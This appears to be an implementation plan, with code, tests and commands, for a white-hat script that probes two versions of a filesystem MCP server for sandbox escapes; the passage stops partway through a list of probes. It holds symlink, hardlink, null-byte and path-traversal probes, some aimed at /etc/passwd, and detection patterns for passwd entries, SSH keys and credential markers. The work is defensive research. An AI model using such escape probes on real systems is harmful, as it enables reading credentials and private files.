# Filesystem MCP Attack Chains — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build `tests/testbed/attack_fs_chains.py` — a research-driven attack campaign that runs 15 multi-step attack chains against the pinned (v2025.3.28) and latest (v2025.7.29) filesystem MCP servers using only `read_file` and `list_directory`, and produces an 8-sheet Excel report at `tests/testbed/excel_reports/fs_attack_chains.xlsx`.

**Architecture:** Single Python script following the pattern of `tests/testbed/generate_fs_research.py`. Host is Windows; both servers run inside WSL via `wsl node .../index.js /tmp/mcp_attack_{ver}`. Fixtures (symlinks, hardlinks, NFD filenames, FIFOs, null-byte names) are planted inside WSL using `subprocess.run(["wsl", "bash", "-c", ...])` or `wsl python3 -c ...` since Windows can't create most of those. Each chain has a `setup(version)` that wipes and rebuilds its sandbox before the chain runs.

**Tech Stack:** Python 3.11+, `mcp` SDK (`ClientSession`, `stdio_client`), `openpyxl`, `asyncio`, `subprocess`, `concurrent.futures` (for the TOCTOU race chain only).

**Spec:** `docs/superpowers/specs/2026-04-10-fs-attack-chains-design.md`

---

## File Structure

- Create: `tests/testbed/attack_fs_chains.py` — main script (everything lives here)
- Create: `tests/testbed/excel_reports/fs_attack_chains.xlsx` — report output (generated at runtime)
- Create: `tests/testbed/excel_reports/fs_attack_chains.raw.jsonl` — audit log (generated at runtime)
- Create: `tests/testbed/excel_reports/fs_attack_chains.source_notes.md` — source analysis output (generated at runtime)
- Create: `tests/testbed/tests/test_attack_fs_chains.py` — unit tests for pure helpers (hit scorer, truncation, severity ranking)
- Modify: `.gitignore` — exclude the generated `.jsonl` audit log (the `.xlsx` and `.md` report are checked in)

---

## Task 1: Scaffold the script with constants and main skeleton

**Files:**
- Create: `tests/testbed/attack_fs_chains.py`

- [ ] **Step 1: Create the file with header, imports, constants, and an empty main**

```python
"""Filesystem MCP — Attack Chains Campaign.

White-hat research engagement against the official filesystem MCP server,
using only read_file and list_directory. Runs 15 multi-step attack chains
against two versions side-by-side:
  v2025.3.28 — /tmp/fs_328 (pinned, vulnerable)
  v2025.7.29 — /tmp/fs_729 (latest, patched)

Outputs:
  tests/testbed/excel_reports/fs_attack_chains.xlsx
  tests/testbed/excel_reports/fs_attack_chains.raw.jsonl
  tests/testbed/excel_reports/fs_attack_chains.source_notes.md

Safety: all filesystem state lives under /tmp/mcp_attack_{328,729} and
/tmp/victim_{328,729}. Nothing is written outside /tmp. Escape detection
uses a canary string 'ATTACKER_CANARY_12345' — real host secrets are
never the success condition.
"""

from __future__ import annotations

import asyncio
import json
import re
import subprocess
import sys
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

FS_328 = "/tmp/fs_328/node_modules/@modelcontextprotocol/server-filesystem/dist/index.js"
FS_729 = "/tmp/fs_729/node_modules/@modelcontextprotocol/server-filesystem/dist/index.js"

SANDBOX_328 = "/tmp/mcp_attack_328"
SANDBOX_729 = "/tmp/mcp_attack_729"
VICTIM_328 = "/tmp/victim_328"
VICTIM_729 = "/tmp/victim_729"

CANARY = "ATTACKER_CANARY_12345"
CANARY_FILE_CONTENT = f"root:x:0:0:canary:/root:/bin/bash\n{CANARY}\n"

REPORTS_DIR = Path(__file__).resolve().parent / "excel_reports"
XLSX_OUT = REPORTS_DIR / "fs_attack_chains.xlsx"
JSONL_OUT = REPORTS_DIR / "fs_attack_chains.raw.jsonl"
NOTES_OUT = REPORTS_DIR / "fs_attack_chains.source_notes.md"

REQUEST_TIMEOUT_SEC = 15
SERVER_INIT_TIMEOUT_SEC = 30
RACE_BUDGET_SEC = 30
MAX_RESPONSE_BYTES = 10 * 1024 * 1024   # 10 MB cap per response
DOS_SIZE_THRESHOLD = 5 * 1024 * 1024    # 5 MB flags as HIGH

SANDBOXES = {"328": SANDBOX_328, "729": SANDBOX_729}
VICTIMS = {"328": VICTIM_328, "729": VICTIM_729}
SERVERS = {"328": FS_328, "729": FS_729}


def main() -> None:
    REPORTS_DIR.mkdir(parents=True, exist_ok=True)
    print("attack_fs_chains.py — scaffold OK (no phases implemented yet)")


if __name__ == "__main__":
    main()
```

- [ ] **Step 2: Verify the script runs without error**

Run: `uv run python tests/testbed/attack_fs_chains.py`
Expected output: `attack_fs_chains.py — scaffold OK (no phases implemented yet)`

- [ ] **Step 3: Commit**

```bash
git add tests/testbed/attack_fs_chains.py
git commit -m "feat(testbed): scaffold fs attack chains script"
```

---

## Task 2: Shell helpers for fixture planting inside WSL

**Files:**
- Modify: `tests/testbed/attack_fs_chains.py` (add helpers above `main()`)

- [ ] **Step 1: Add WSL shell helpers**

Add this block above `main()`:

```python
# ---------------------------------------------------------------------------
# WSL shell helpers — all fixture planting happens inside WSL because the
# servers run there and Windows can't create Unix symlinks / hardlinks / FIFOs.
# ---------------------------------------------------------------------------

def wsl_bash(script: str, check: bool = True, timeout: int = 30) -> subprocess.CompletedProcess:
    """Run a bash script inside WSL and return the CompletedProcess."""
    return subprocess.run(
        ["wsl", "bash", "-lc", script],
        capture_output=True,
        text=True,
        check=check,
        timeout=timeout,
    )


def wsl_python(script: str, check: bool = True, timeout: int = 30) -> subprocess.CompletedProcess:
    """Run a python3 one-liner inside WSL. Use for operations that need raw
    bytes in filenames (null byte, non-UTF8) that bash cannot express."""
    return subprocess.run(
        ["wsl", "python3", "-c", script],
        capture_output=True,
        text=True,
        check=check,
        timeout=timeout,
    )


def wsl_file_exists(path: str) -> bool:
    cp = wsl_bash(f"test -e {path!r} && echo yes || echo no", check=False)
    return cp.stdout.strip() == "yes"


def wsl_read_file(path: str) -> str:
    cp = wsl_bash(f"cat {path!r}", check=False)
    return cp.stdout
```

- [ ] **Step 2: Smoke-test the WSL bridge by calling it from main**

Temporarily replace `main()` with:

```python
def main() -> None:
    REPORTS_DIR.mkdir(parents=True, exist_ok=True)
    cp = wsl_bash("uname -a && node --version")
    print(cp.stdout)


if __name__ == "__main__":
    main()
```

Run: `uv run python tests/testbed/attack_fs_chains.py`
Expected: prints the Linux kernel string and the installed Node version (e.g. `v20.x.x`). Confirms the WSL bridge and Node are available. If this fails, stop — the rest of the plan depends on WSL being reachable and Node being installed.

- [ ] **Step 3: Revert main() to its placeholder**

```python
def main() -> None:
    REPORTS_DIR.mkdir(parents=True, exist_ok=True)
    print("attack_fs_chains.py — scaffold OK")
```

- [ ] **Step 4: Commit**

```bash
git add tests/testbed/attack_fs_chains.py
git commit -m "feat(testbed): add WSL shell helpers for fixture planting"
```

---

## Task 3: Fixture builder — sandbox reset + victim canary

**Files:**
- Modify: `tests/testbed/attack_fs_chains.py`

- [ ] **Step 1: Add fixture-building helpers**

Add below the WSL helpers:

```python
# ---------------------------------------------------------------------------
# Fixture builder — wipe and rebuild per-version sandbox state.
# ---------------------------------------------------------------------------

def wipe_and_recreate(version: str) -> None:
    """Reset sandbox + victim dir for one version to a clean baseline."""
    sandbox = SANDBOXES[version]
    victim = VICTIMS[version]
    script = f"""
        set -e
        rm -rf {sandbox!r} {victim!r}
        mkdir -p {sandbox!r} {victim!r}
        printf '%s' {CANARY_FILE_CONTENT!r} > {victim!r}/passwd_canary
        echo 'hello from the sandbox' > {sandbox!r}/readme.txt
        mkdir -p {sandbox!r}/subdir
        echo 'nested file' > {sandbox!r}/subdir/nested.txt
    """
    wsl_bash(script)


def wipe_all() -> None:
    for v in SANDBOXES:
        wipe_and_recreate(v)
```

- [ ] **Step 2: Verify fixtures work end-to-end via a temporary main**

Temporarily replace `main()`:

```python
def main() -> None:
    REPORTS_DIR.mkdir(parents=True, exist_ok=True)
    wipe_all()
    for v in SANDBOXES:
        assert wsl_file_exists(f"{SANDBOXES[v]}/readme.txt"), f"sandbox {v} missing readme"
        content = wsl_read_file(f"{VICTIMS[v]}/passwd_canary")
        assert CANARY in content, f"victim {v} missing canary"
    print("fixture builder OK")
```

Run: `uv run python tests/testbed/attack_fs_chains.py`
Expected: `fixture builder OK`

- [ ] **Step 3: Revert main() to placeholder and commit**

```python
def main() -> None:
    REPORTS_DIR.mkdir(parents=True, exist_ok=True)
    print("attack_fs_chains.py — scaffold OK")
```

```bash
git add tests/testbed/attack_fs_chains.py
git commit -m "feat(testbed): add fixture builder with canary files"
```

---

## Task 4: Unit-test the hit scorer (TDD)

**Files:**
- Create: `tests/testbed/tests/test_attack_fs_chains.py`

- [ ] **Step 1: Create the tests directory and __init__.py**

```bash
mkdir -p tests/testbed/tests
```

Create `tests/testbed/tests/__init__.py` as an empty file.

- [ ] **Step 2: Write the failing tests**

Create `tests/testbed/tests/test_attack_fs_chains.py`:

```python
"""Unit tests for pure helpers in attack_fs_chains.py."""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from attack_fs_chains import CANARY, classify_hit, clean_text, truncate


def test_classify_canary_is_critical():
    pinned = "some bytes including ATTACKER_CANARY_12345 in the middle"
    latest = "Error: outside allowed directories"
    sev, reason, regression = classify_hit(
        input_path="/tmp/mcp_attack_328/link",
        pinned=pinned,
        latest=latest,
        pinned_elapsed_ms=20,
        latest_elapsed_ms=20,
    )
    assert sev == "CRITICAL"
    assert "canary" in reason.lower()
    assert regression is True  # pinned hit, latest blocked — divergence


def test_classify_etc_passwd_marker_is_critical():
    response = "root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\n"
    sev, _, _ = classify_hit("", response, response, 10, 10)
    assert sev == "CRITICAL"


def test_classify_ssh_key_is_critical():
    response = "-----BEGIN OPENSSH PRIVATE KEY-----\nbase64blob\n-----END-----"
    sev, _, _ = classify_hit("", response, response, 10, 10)
    assert sev == "CRITICAL"


def test_classify_timeout_is_high():
    sev, reason, _ = classify_hit("", "", "", 12000, 12000)
    assert sev == "HIGH"
    assert "timeout" in reason.lower() or "slow" in reason.lower()


def test_classify_huge_response_is_high():
    blob = "x" * (6 * 1024 * 1024)  # 6 MB > 5 MB threshold
    sev, reason, _ = classify_hit("", blob, blob, 100, 100)
    assert sev == "HIGH"
    assert "mb" in reason.lower() or "dos" in reason.lower()


def test_classify_absolute_path_leak_is_medium():
    response = "ENOENT: no such file at /home/alice/secret_project/node_modules/foo"
    sev, _, _ = classify_hit("bar.txt", response, response, 10, 10)
    assert sev == "MEDIUM"


def test_classify_regression_is_low():
    sev, _, regression = classify_hit(
        input_path="some/path",
        pinned="Error: outside allowed directories",
        latest="file contents returned ok",
        pinned_elapsed_ms=10,
        latest_elapsed_ms=10,
    )
    assert regression is True
    assert sev in {"LOW", "CRITICAL", "HIGH"}  # depends on content; LOW if no canary/marker


def test_classify_clean_is_info():
    sev, _, regression = classify_hit("ok.txt", "hello", "hello", 10, 10)
    assert sev == "INFO"
    assert regression is False


def test_clean_text_strips_control_chars():
    assert clean_text("ok\x00bad") == "ok<0x00>bad"
    assert clean_text("tab\there") == "tab\there"  # tabs are OK


def test_truncate_keeps_short_strings():
    assert truncate("short", 100) == "short"


def test_truncate_marks_long_strings():
    s = "a" * 500
    result = truncate(s, 100)
    assert len(result) < len(s)
    assert "500" in result  # the truncation marker includes the original length
```

- [ ] **Step 3: Run the tests and verify they fail**

Run: `uv run pytest tests/testbed/tests/test_attack_fs_chains.py -v`
Expected: all tests fail with `ImportError: cannot import name 'classify_hit' from 'attack_fs_chains'` (or similar).

- [ ] **Step 4: Implement the helpers to make the tests pass**

Add to `attack_fs_chains.py` above `main()`:

```python
# ---------------------------------------------------------------------------
# Pure helpers — text cleaning, truncation, and hit classification.
# ---------------------------------------------------------------------------

_CTRL_RE = re.compile(r"[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]")
_ABS_PATH_RE = re.compile(r"(?:/[a-zA-Z0-9_.+-]+){2,}")
_SECRET_MARKERS = ("AWS_SECRET", "API_KEY", "PASSWORD=", "SECRET_KEY")


def clean_text(text: str) -> str:
    return _CTRL_RE.sub(lambda m: f"<0x{ord(m.group()):02x}>", text)


def truncate(text: str, limit: int = 600) -> str:
    text = clean_text(text)
    if len(text) <= limit:
        return text
    return text[:limit] + f"\n[...{len(text)} chars total]"


def classify_hit(
    input_path: Any,
    pinned: str,
    latest: str,
    pinned_elapsed_ms: int,
    latest_elapsed_ms: int,
) -> tuple[str, str, bool]:
    """Return (severity, reason, is_regression)."""
    regression = _is_regression(pinned, latest)
    combined = f"{pinned}\n{latest}"

    # CRITICAL checks — any hit wins regardless of regression
    if CANARY in combined:
        return "CRITICAL", f"canary string '{CANARY}' leaked — real sandbox escape", regression
    if re.search(r"\broot:x:", combined):
        return "CRITICAL", "/etc/passwd marker 'root:x:' in response", regression
    if "BEGIN OPENSSH" in combined or "BEGIN RSA" in combined or "ssh-rsa " in combined:
        return "CRITICAL", "SSH key material in response", regression
    if any(m in combined for m in _SECRET_MARKERS):
        return "CRITICAL", "credential marker in response", regression

    # HIGH checks
    if pinned_elapsed_ms >= REQUEST_TIMEOUT_SEC * 1000 or latest_elapsed_ms >= REQUEST_TIMEOUT_SEC * 1000:
        return "HIGH", "request timeout / hang (>= 15s)", regression
    if len(pinned) >= DOS_SIZE_THRESHOLD or len(latest) >= DOS_SIZE_THRESHOLD:
        mb = max(len(pinned), len(latest)) / (1024 * 1024)
        return "HIGH", f"oversized response ({mb:.1f} MB) — DoS candidate", regression
    if "Traceback" in combined or "UnhandledPromiseRejection" in combined or "at Object." in combined:
        return "HIGH", "stack trace in response (unhandled error)", regression

    # MEDIUM checks — info leak
    input_str = str(input_path) if input_path is not None else ""
    for match in _ABS_PATH_RE.findall(combined):
        if match and match not in input_str and "node_modules" in match:
            return "MEDIUM", f"internal path leaked: {match[:80]}", regression
        if match and match not in input_str and match.startswith(("/home/", "/root/", "/Users/")):
            return "MEDIUM", f"host path leaked: {match[:80]}", regression
    if "node:internal" in combined or "v" in pinned and re.search(r"node\s*v\d", combined):
        return "MEDIUM", "Node internals leaked in error", regression

    if regression:
        return "LOW", "behavioral divergence between versions", True

    return "INFO", "no hit", False


def _is_regression(pinned: str, latest: str) -> bool:
    """True if the two versions behaved meaningfully differently."""
    def is_block(text: str) -> bool:
        low = text.lower()
        return any(k in low for k in ("access denied", "outside allowed", "not allowed", "forbidden", "error:"))

    p_blocked = is_block(pinned)
    l_blocked = is_block(latest)
    if p_blocked != l_blocked:
        return True
    # Both returned content — see if they differ meaningfully
    if not p_blocked and not l_blocked:
        p2 = re.sub(r"\s+", " ", pinned.strip().lower())
        l2 = re.sub(r"\s+", " ", latest.strip().lower())
        return p2 != l2
    return False
```

- [ ] **Step 5: Run tests — verify they pass**

Run: `uv run pytest tests/testbed/tests/test_attack_fs_chains.py -v`
Expected: all 11 tests pass.

- [ ] **Step 6: Commit**

```bash
git add tests/testbed/tests/test_attack_fs_chains.py tests/testbed/attack_fs_chains.py
git commit -m "feat(testbed): hit scorer + text helpers with tests"
```

---

## Task 5: MCP client helper (async runner per version)

**Files:**
- Modify: `tests/testbed/attack_fs_chains.py`

- [ ] **Step 1: Add a dataclass for step results**

Add below the pure helpers:

```python
# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------

@dataclass
class StepCall:
    """One tool call to make. Populated by chain definitions."""
    chain_id: str
    step_num: int
    pre_setup: str            # shell lines executed before the call (documentation)
    tool: str                 # "read_file" or "list_directory"
    path: Any                 # the path argument — may be non-string for type confusion
    extra_args: dict[str, Any] = field(default_factory=dict)
    label: str = ""


@dataclass
class StepResult:
    chain_id: str
    step_num: int
    tool: str
    path_repr: str
    label: str
    pre_setup: str
    pinned_response: str
    pinned_elapsed_ms: int
    latest_response: str
    latest_elapsed_ms: int
    severity: str = "INFO"
    reason: str = ""
    is_regression: bool = False
```

- [ ] **Step 2: Add the async MCP client runner**

```python
# ---------------------------------------------------------------------------
# MCP client — spawns one stdio server per version per call batch.
# ---------------------------------------------------------------------------

async def _call_batch(version: str, calls: list[StepCall]) -> list[tuple[str, int]]:
    """Run calls against one version's server. Returns list of (response_text, elapsed_ms)."""
    from mcp import ClientSession
    from mcp.client.stdio import StdioServerParameters, stdio_client
    import anyio

    params = StdioServerParameters(
        command="wsl",
        args=["node", SERVERS[version], SANDBOXES[version]],
    )
    out: list[tuple[str, int]] = []

    async def one(session: ClientSession, call: StepCall) -> tuple[str, int]:
        t0 = time.monotonic()
        try:
            args = {"path": call.path, **call.extra_args}
            with anyio.fail_after(REQUEST_TIMEOUT_SEC):
                resp = await session.call_tool(call.tool, args)
            parts = [b.text for b in (resp.content or []) if hasattr(b, "text")]
            text = "\n".join(parts) or "(empty response)"
        except TimeoutError:
            text = f"TIMEOUT after {REQUEST_TIMEOUT_SEC}s"
        except Exception as exc:
            text = f"TOOL ERROR: {type(exc).__name__}: {exc}"
        elapsed_ms = int((time.monotonic() - t0) * 1000)
        if len(text) > MAX_RESPONSE_BYTES:
            text = text[:MAX_RESPONSE_BYTES] + f"\n[TRUNCATED — original {len(text)} bytes]"
        return text, elapsed_ms

    try:
        async with stdio_client(params) as (read, write):
            async with ClientSession(read, write) as session:
                with anyio.fail_after(SERVER_INIT_TIMEOUT_SEC):
                    await session.initialize()
                for call in calls:
                    out.append(await one(session, call))
                    print(".", end="", flush=True)
    except Exception as exc:
        remaining = len(calls) - len(out)
        print(f"\n  [server {version} fatal] {exc}")
        out.extend([(f"SERVER FAILED: {exc}", 0)] * remaining)

    return out


def run_calls_both_versions(calls: list[StepCall]) -> list[StepResult]:
    """Run the same call list against both versions, pair them, score them."""
    print(f"\n  v2025.3.28 ", end="", flush=True)
    p = asyncio.run(_call_batch("328", calls))
    print(f" done.\n  v2025.7.29 ", end="", flush=True)
    l = asyncio.run(_call_batch("729", calls))
    print(" done.")

    results: list[StepResult] = []
    for call, (pr, pe), (lr, le) in zip(calls, p, l):
        sev, reason, regression = classify_hit(call.path, pr, lr, pe, le)
        results.append(StepResult(
            chain_id=call.chain_id,
            step_num=call.step_num,
            tool=call.tool,
            path_repr=repr(call.path)[:300],
            label=call.label,
            pre_setup=call.pre_setup,
            pinned_response=pr,
            pinned_elapsed_ms=pe,
            latest_response=lr,
            latest_elapsed_ms=le,
            severity=sev,
            reason=reason,
            is_regression=regression,
        ))
    return results
```

- [ ] **Step 3: Smoke-test with one baseline read against both versions**

Temporarily replace `main()`:

```python
def main() -> None:
    REPORTS_DIR.mkdir(parents=True, exist_ok=True)
    wipe_all()
    calls = [
        StepCall("SMOKE", 1, "baseline read", "read_file",
                 f"{SANDBOX_328}/readme.txt", label="sanity read (pinned)"),
        StepCall("SMOKE", 2, "baseline read", "read_file",
                 f"{SANDBOX_729}/readme.txt", label="sanity read (latest)"),
    ]
    # Note: a call with the 328 path hits the 328 server and the 729 path hits the 729 server.
    # For this smoke test we send each version only its own path — we'll build a per-version
    # call list for the real campaign. Here we just fire SANDBOX_{version}/readme.txt at each:
    results = run_calls_both_versions([
        StepCall("SMOKE", 1, "", "read_file", f"{SANDBOX_328}/readme.txt", label="pinned sanity"),
    ])
    for r in results:
        print(r.severity, r.reason, repr(r.pinned_response)[:120])
```

Run: `uv run python tests/testbed/attack_fs_chains.py`
Expected: prints `INFO no hit 'hello from the sandbox'` (the 729 call will fail because the path is under `/tmp/mcp_attack_328`, which is outside the 729 server's allow-list — that's expected and informative; the smoke test only proves the MCP bridge works).

Decision note: because the two servers are spawned with different sandbox roots, the *same input path string* will land inside one version's allow-list and outside the other's. To keep the comparison meaningful the chain definitions (Task 7 onward) will use a **per-version templated path** — see the `render_call_for_version()` helper added in the next task.

- [ ] **Step 4: Revert main() and commit**

```python
def main() -> None:
    REPORTS_DIR.mkdir(parents=True, exist_ok=True)
    print("attack_fs_chains.py — scaffold OK")
```

```bash
git add tests/testbed/attack_fs_chains.py
git commit -m "feat(testbed): async MCP client runner with timeouts"
```

---

## Task 6: Per-version path templating

**Files:**
- Modify: `tests/testbed/attack_fs_chains.py`

**Why:** The 328 server is pointed at `/tmp/mcp_attack_328` and the 729 server at `/tmp/mcp_attack_729`. A chain that plants a symlink must plant it in **both** sandboxes and use the correct path when calling each server. We templatize paths with a `{SANDBOX}` / `{VICTIM}` placeholder and render them per version at call time.

- [ ] **Step 1: Rewrite `run_calls_both_versions` to render per-version paths**

Replace the function with:

```python
def render_path(value: Any, version: str) -> Any:
    """Resolve {SANDBOX} / {VICTIM} placeholders for one version.
    Non-string values pass through unchanged (for type-confusion tests)."""
    if not isinstance(value, str):
        return value
    return value.replace("{SANDBOX}", SANDBOXES[version]).replace("{VICTIM}", VICTIMS[version])


def run_calls_both_versions(calls: list[StepCall]) -> list[StepResult]:
    calls_328 = [
        StepCall(c.chain_id, c.step_num, c.pre_setup, c.tool,
                 render_path(c.path, "328"),
                 {k: render_path(v, "328") for k, v in c.extra_args.items()},
                 c.label)
        for c in calls
    ]
    calls_729 = [
        StepCall(c.chain_id, c.step_num, c.pre_setup, c.tool,
                 render_path(c.path, "729"),
                 {k: render_path(v, "729") for k, v in c.extra_args.items()},
                 c.label)
        for c in calls
    ]

    print(f"\n  v2025.3.28 ", end="", flush=True)
    p = asyncio.run(_call_batch("328", calls_328))
    print(f" done.\n  v2025.7.29 ", end="", flush=True)
    l = asyncio.run(_call_batch("729", calls_729))
    print(" done.")

    results: list[StepResult] = []
    for original, (pr, pe), (lr, le) in zip(calls, p, l):
        sev, reason, regression = classify_hit(original.path, pr, lr, pe, le)
        results.append(StepResult(
            chain_id=original.chain_id,
            step_num=original.step_num,
            tool=original.tool,
            path_repr=repr(original.path)[:300],
            label=original.label,
            pre_setup=original.pre_setup,
            pinned_response=pr,
            pinned_elapsed_ms=pe,
            latest_response=lr,
            latest_elapsed_ms=le,
            severity=sev,
            reason=reason,
            is_regression=regression,
        ))
    return results
```

- [ ] **Step 2: Smoke-test templated paths**

Temporarily in `main()`:

```python
def main() -> None:
    REPORTS_DIR.mkdir(parents=True, exist_ok=True)
    wipe_all()
    results = run_calls_both_versions([
        StepCall("SMOKE", 1, "", "read_file", "{SANDBOX}/readme.txt", label="templated sanity"),
    ])
    r = results[0]
    print("PINNED :", r.pinned_response[:80])
    print("LATEST :", r.latest_response[:80])
    print("SEV    :", r.severity)
```

Run: `uv run python tests/testbed/attack_fs_chains.py`
Expected: both pinned and latest return `hello from the sandbox`, severity is `INFO`.

- [ ] **Step 3: Revert main() and commit**

```python
def main() -> None:
    REPORTS_DIR.mkdir(parents=True, exist_ok=True)
    print("attack_fs_chains.py — scaffold OK")
```

```bash
git add tests/testbed/attack_fs_chains.py
git commit -m "feat(testbed): per-version path templating for chain steps"
```

---

## Task 7: Phase 0 — source analysis

**Files:**
- Modify: `tests/testbed/attack_fs_chains.py`

**Why:** The source analysis is a one-shot manual read of both versions' `index.js` files, captured as a static data structure. It gets written to `fs_attack_chains.source_notes.md` at runtime and fed into the `02_Source_Analysis` Excel sheet.

- [ ] **Step 1: Read both versions' index.js inside WSL and skim for path validation**

Run: `wsl bash -lc "wc -l /tmp/fs_328/node_modules/@modelcontextprotocol/server-filesystem/dist/index.js /tmp/fs_729/node_modules/@modelcontextprotocol/server-filesystem/dist/index.js"`
Expected: prints line counts of both files.

Run: `wsl bash -lc "grep -n 'realpath\|normalize\|validatePath\|allowed' /tmp/fs_328/node_modules/@modelcontextprotocol/server-filesystem/dist/index.js | head -40"`
Expected: shows the lines where path validation happens in the pinned version.

Run the same against `/tmp/fs_729/...`.

Capture what you see in a scratch buffer — you'll hardcode it in Step 2 below.

- [ ] **Step 2: Add the `SOURCE_NOTES` data structure with your real findings**

Add above `main()`:

```python
# ---------------------------------------------------------------------------
# Phase 0 — Source analysis.
#
# Populated by manually reading both versions' index.js during Task 7.
# Each entry names a function in the server source, shows a short snippet,
# and identifies the gap that an attack chain below is aimed at.
# ---------------------------------------------------------------------------

SOURCE_NOTES: list[dict[str, str]] = [
    {
        "version": "v2025.3.28",
        "function": "validatePath",
        "snippet": "<paste 5-10 lines from the actual index.js here>",
        "gap_identified": "<e.g. uses startsWith on allowed dir without trailing slash>",
        "attack_idea": "<which chain this feeds, e.g. C1 Prefix confusion>",
    },
    # ... one entry per interesting function in each version.
    # Target at least: path validation entry point, realpath call, normalize
    # call, error-message construction, allowed-dir check. Both versions.
]


def write_source_notes() -> None:
    lines = ["# Filesystem MCP Source Analysis\n"]
    for e in SOURCE_NOTES:
        lines.append(f"## {e['version']} — `{e['function']}`\n")
        lines.append(f"```js\n{e['snippet']}\n```\n")
        lines.append(f"**Gap:** {e['gap_identified']}\n")
        lines.append(f"**Attack:** {e['attack_idea']}\n\n")
    NOTES_OUT.write_text("".join(lines), encoding="utf-8")
```

Note: the placeholder dict above is a *scaffold* only. Before the plan is considered complete, replace the placeholders with real snippets read from the two index.js files. Leaving `<paste ...>` markers in the committed code is a plan failure.

- [ ] **Step 3: Commit**

```bash
git add tests/testbed/attack_fs_chains.py
git commit -m "feat(testbed): phase 0 source analysis scaffold + notes writer"
```

---

## Task 8: Phase 1 — recon probes

**Files:**
- Modify: `tests/testbed/attack_fs_chains.py`

- [ ] **Step 1: Add the recon calls**

```python
# ---------------------------------------------------------------------------
# Phase 1 — Recon. Legitimate-looking requests whose errors leak info.
# ---------------------------------------------------------------------------

def recon_calls() -> list[StepCall]:
    return [
        StepCall("RECON", 1, "", "read_file", "",
                 label="empty-string path — does error echo allowed dirs?"),
        StepCall("RECON", 2, "", "read_file", "/",
                 label="root path — does error reveal canonical sandbox path?"),
        StepCall("RECON", 3, "", "list_directory", "",
                 label="list empty path"),
        StepCall("RECON", 4, "", "list_directory", "/",
                 label="list root"),
        StepCall("RECON", 5, "", "read_file", "/etc/passwd",
                 label="direct /etc/passwd — expected block, fingerprint error shape"),
        StepCall("RECON", 6, "", "read_file", "{SANDBOX}",
                 label="read sandbox itself as a file — EISDIR error shape"),
        StepCall("RECON", 7, "", "list_directory", "{SANDBOX}/nonexistent",
                 label="ENOENT error shape — does it echo absolute path?"),
        StepCall("RECON", 8, "", "read_file", "{SANDBOX}/readme.txt",
                 label="baseline success — expected clean content return"),
        StepCall("RECON", 9, "", "list_directory", "{SANDBOX}",
                 label="baseline list success"),
        StepCall("RECON", 10, "", "read_file", "../etc/passwd",
                 label="relative traversal — what is cwd?"),
    ]
```

- [ ] **Step 2: Add a phase runner stub for recon**

```python
def run_recon_phase() -> list[StepResult]:
    print("\n[Phase 1] Recon")
    return run_calls_both_versions(recon_calls())
```

- [ ] **Step 3: Exercise it from main**

Temporarily:

```python
def main() -> None:
    REPORTS_DIR.mkdir(parents=True, exist_ok=True)
    wipe_all()
    results = run_recon_phase()
    for r in results:
        print(f"  [{r.severity:>8}] {r.label}")
```

Run: `uv run python tests/testbed/attack_fs_chains.py`
Expected: 10 probe results printed, each tagged with a severity. At least some should be `INFO` (baseline success) and some `MEDIUM` (if error messages leak absolute paths).

- [ ] **Step 4: Revert main() and commit**

```python
def main() -> None:
    REPORTS_DIR.mkdir(parents=True, exist_ok=True)
    print("attack_fs_chains.py — scaffold OK")
```

```bash
git add tests/testbed/attack_fs_chains.py
git commit -m "feat(testbed): phase 1 recon probes"
```

---

## Task 9: Phase 2 — primitive discovery probes

**Files:**
- Modify: `tests/testbed/attack_fs_chains.py`

- [ ] **Step 1: Add a fixture planter that covers all primitives**

```python
def plant_primitives(version: str) -> None:
    """Build the fixture set needed by Phase 2 primitives."""
    sandbox = SANDBOXES[version]
    victim = VICTIMS[version]
    script = f"""
        set -e
        cd {sandbox!r}
        # symlink to a file outside sandbox
        ln -sf {victim!r}/passwd_canary sym_to_canary
        # hardlink to a file outside sandbox (same fs under /tmp)
        ln -f {victim!r}/passwd_canary hard_to_canary || true
        # NFD-encoded filename 'café' (e + combining acute)
        python3 -c 'open("cafe\\u0301.txt", "w").write("NFD file content\\n")'
        # regular NFC 'café' file
        python3 -c 'open("caf\\u00e9.txt", "w").write("NFC file content\\n")'
        # file with null byte in the name (bash can't, use python)
        python3 -c 'open("ok.txt\\x00hidden", "w").write("null byte content\\n")'
    """
    wsl_bash(script)
```

- [ ] **Step 2: Add primitive calls**

```python
# ---------------------------------------------------------------------------
# Phase 2 — Primitive discovery. One question per probe.
# ---------------------------------------------------------------------------

def primitive_calls() -> list[StepCall]:
    return [
        StepCall("PRIM", 1, "ln -s {VICTIM}/passwd_canary {SANDBOX}/sym_to_canary",
                 "read_file", "{SANDBOX}/sym_to_canary",
                 label="Q: does realpath reject the symlink target outside sandbox?"),
        StepCall("PRIM", 2, "ln {VICTIM}/passwd_canary {SANDBOX}/hard_to_canary",
                 "read_file", "{SANDBOX}/hard_to_canary",
                 label="Q: does realpath detect hardlinks? (it cannot — this is the bet)"),
        StepCall("PRIM", 3, "", "read_file", "{SANDBOX}_evil/anything",
                 label="Q: is allow-list check startsWith without trailing slash?"),
        StepCall("PRIM", 4, "NFD file café = e + combining acute",
                 "read_file", "{SANDBOX}/caf\u00e9.txt",
                 label="Q: NFC query finds NFD-named file?"),
        StepCall("PRIM", 5, "", "read_file", "{SANDBOX}/ok.txt\x00hidden",
                 label="Q: does path handling truncate at null byte?"),
        StepCall("PRIM", 6, "", "read_file", "{SANDBOX}/../mcp_attack_328/readme.txt",
                 label="Q: does normalize run before or after allow-list check?"),
        StepCall("PRIM", 7, "", "list_directory", "{SANDBOX}/.",
                 label="Q: does '.' segment pass through normalize?"),
        StepCall("PRIM", 8, "", "read_file", "{SANDBOX}/./readme.txt",
                 label="Q: is dot-segment normalization consistent?"),
        StepCall("PRIM", 9, "", "read_file", "{SANDBOX}//readme.txt",
                 label="Q: is double-slash collapsed by normalize?"),
        StepCall("PRIM", 10, "", "read_file", "{SANDBOX}/readme.txt\x00",
                 label="Q: trailing null byte — rejected or truncated?"),
